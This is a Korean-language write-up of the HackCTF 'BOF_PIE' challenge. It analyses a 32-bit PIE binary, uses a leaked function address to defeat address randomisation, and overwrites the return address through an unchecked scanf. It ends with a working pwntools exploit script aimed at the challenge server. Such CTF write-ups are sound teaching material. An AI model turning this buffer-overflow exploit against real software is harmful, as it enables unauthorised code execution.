**HackCTF - BOF_PIE**

| layout | title            | auther   | categories | tags           |
| ------ | ---------------- | -------- | ---------- | -------------- |
| post   | HackCTF - offset | Y3oj4eng | writeup    | writeupwargame |


# Analysis
`file` 명령어를 통해 바이너리의 정보를 획득한다.
```bash
mac at ubuntu in ~/Desktop/hackCTF
$ file bof_pie 
bof_pie: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=51bf2a67853257d1a3c8a539861e79160befe163, not stripped

```

`checksec` 명령어를 통해 해당 바이너리에 적용된 `mitigation`을 확인한다.

```bash
 at ubuntu in ~/Desktop/hackCTF
$ checksec bof_pie 
[*] '/home/mac/Desktop/hackCTF/bof_pie'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

이름대로 `PIE` 메모리 보호기법이 적용되어져 있으며 `NX`도 함꼐 적용되었다.
따라서 메모리 레이아웃 모든 영역이 랜덤하게 매핑되며 `Stack`과 `Heap` 영역에서의 실행권한을 갖지 못한다.

기본적인 정보는 모두 획득하였으니 프로그램을 실행시켜보도록 한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ ./bof_pie 
Hello, Do you know j0n9hyun?
j0n9hyun is 0x5658c909
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    1965 segmentation fault (core dumped)  ./bof_pie

mac at ubuntu in ~/Desktop/hackCTF
$ ./bof_pie
Hello, Do you know j0n9hyun?
j0n9hyun is 0x565af909
AAAAAAAAAAAA
Nah...
```

바이너리를 실행시키면 `Hello, DO you know j0n9hyun?` 이라는 문자열을 첫 줄에 출력한 뒤
`jon9hyun is` 문자열과 함께 주소값을 출력한다.
이후에 사용자로부터 값을 입력받으며 첫 시도시에는 `segmentation fault` 에러를 뿜길래 두번째 시도에는 조금만 값을 입력했더니 `Nah...`라는 문자열을 출력한 뒤 프로그램이 종료되었다.

본격적으로 분석을 진행해본다.

![image](https://user-images.githubusercontent.com/33051018/75939161-ca624a80-5ecc-11ea-90da-5b2bd2f57a0a.png)

`main` 함수의 구성은 매우 간단했다.

`welcome` 이라는 함수를 호출한 이후, `Nah...` 문자열을 출력한 뒤 종료한다. `welcome`함수를 살펴보도록 한다.

![image](https://user-images.githubusercontent.com/33051018/75939392-68eeab80-5ecd-11ea-917f-be8d94cddf41.png)

`welcome` 함수는 버퍼를 초기화한 이후 일련의 문자열을 출력하고 해당 함수의 주소를 출력한다.
앞전에 프로그램을 실행시켰을때 출력되었던 주소값은 `welcome`함수의 주소값이였다.
이후 `scanf`함수를 통해 `buf` 변수에 값을 입력받는다.
이떄 입력값에 대한 길이를 검증하지 않아 `BOF` 취약점이 존재한다.
상황을 고려하였을때 쉘코드를 이용한 익스는 불가능해보여 함수들을 살펴보던중
`j0n9hyun` 이라는 함수를 확인할 수 있었고 해당 함수는 아래와같이 `flag`를 읽어오는 함수였다.

![image](https://user-images.githubusercontent.com/33051018/75940894-9b020c80-5ed1-11ea-8315-3ab1e440a9b6.png)

`scanf`에서 `BOF`가 터질때 `return address`를 j0n9hyun`의 주소로 뒤덮으면 된다.

그러나, 해당 문제에는 `PIE` 보호기법이 적용되어 프로그램을 실행시킬 때 마다 매번 출력하는 `welcome`함수의 주소가 변경된다. 이말은 즉  `j0n9hyun`함수의 주소도 랜덤하게 매핑된다는 의미이며
이를 해결하기 위해 상대적 주소 접근을 위한 `memory leak`이 필요하다.

**cf) func_addr = libc_base + func_offset**

![image](https://user-images.githubusercontent.com/33051018/75941145-41e6a880-5ed2-11ea-87b9-f3febd04259e.png)

`IDA`를 통해 익스에 필요한 두 함수의 `offset` 값을 알 수 있다.

대략적인 `exploit scenario`는 아래와 같다.
>1. 프로그램 실행중 출력해주는 `welcome`주소값 받아오기.
>2. `welcome_addr` - `welcome_offset` = `base` 연산을 통해 `base`값 획득
>3. 역으로 `base` + `j0n9hyun_offset` = `j0n9hyun_addr` 연산을 통해 `j0n9hyun`함수 주소 획득
>4. `scanf` 함수에서 터지는 `BOF`를 이용해 `return address`를 `j0n9hyun` 함수의 주소 로 `overwrite`




# Exploit
```python
from pwn import *                                                       

p = remote('ctf.j0n9hyun.xyz', 3008)                                    
#p = process('./bof_pie')                                               

# welcome & j0n9hyun offset                                                                      
welcome_offset = 0x00000909                                             
shell_offset = 0x00000890   
                                            
# get the welcome_addr
p.recvuntil('j0n9hyun is ')                                             
welcome_addr = int(p.recv(10), 16)                                      
print('welcome_addr : ' + hex(welcome_addr))                            

#find the base_addr, shell_addr
base = welcome_addr - welcome_offset                                                               
shell = base + shell_offset                                             
                                                                        
print('base addr : ' + hex(base))                                       
print('shell addr : ' + hex(shell))                                     
                                                                        
#dummy = 22bytes                                                                        
payload = 'A'*22                                                        
payload += p32(shell)                                                   
                                                                        
p.sendline(payload)                                                     
                                                                        
p.interactive() 
```

